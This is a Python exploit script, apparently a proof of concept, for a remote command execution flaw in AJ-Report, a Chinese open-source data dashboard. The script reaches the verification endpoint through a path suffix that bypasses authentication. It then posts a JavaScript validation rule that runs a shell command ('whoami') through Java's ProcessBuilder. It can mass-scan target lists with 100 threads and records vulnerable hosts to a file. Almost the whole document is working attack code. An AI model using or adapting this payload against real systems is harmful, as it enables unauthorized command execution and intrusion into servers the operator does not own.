#开源数据大屏AJ-Report存在远程命令执行漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''

 ▄████▄   ▒█████   ███▄ ▄███▓ ███▄ ▄███▓ ▄▄▄       ███▄    █ ▓█████▄    ▓█████ ▒██   ██▒▓█████  ▄████▄  
▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ ▒██▀ ██▌   ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒░██   █▌   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█▄   ▌   ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒
▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░░▒████▓    ░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░
░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒▓  ▒    ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░
  ░  ▒     ░ ▒ ▒░ ░  ░      ░░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░ ░ ▒  ▒     ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒   
░        ░ ░ ░ ▒  ░      ░   ░      ░     ░   ▒      ░   ░ ░  ░ ░  ░       ░    ░    ░     ░   ░        
░ ░          ░ ░         ░          ░         ░  ░         ░    ░          ░  ░ ░    ░     ░  ░░ ░      
░                                                             ░                                ░        
                                                                         version:AJ-Report_Commandexec 1.0
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="开源数据大屏AJ-Report存在远程命令执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                i = i.strip()
                if 'https://' in i:
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/dataSetParam/verification;swagger-ui/'
    url = target + url_payload
    headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
		"Accept-Encoding":"gzip, deflate",
		"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Content-Type":"application/json;charset=UTF-8",
		"Connection":"close",
		"Accept-Language":"zh-CN,zh;q=0.9"
	}
    json={
		"ParamName":"",
		"paramDesc":"",
		"paramType":"",
		"sampleItem":"1",
		"mandatory":"true",
		"requiredFlag":1,
		"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"
		}
    try:
        response = requests.post(url=url,headers=headers,json=json,timeout=5)
        if response.status_code == 200 and '200' in response.text:
            print( f"{GREEN}[+] {url} 存在命令执行漏洞！{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass


if __name__ == '__main__':
    main()
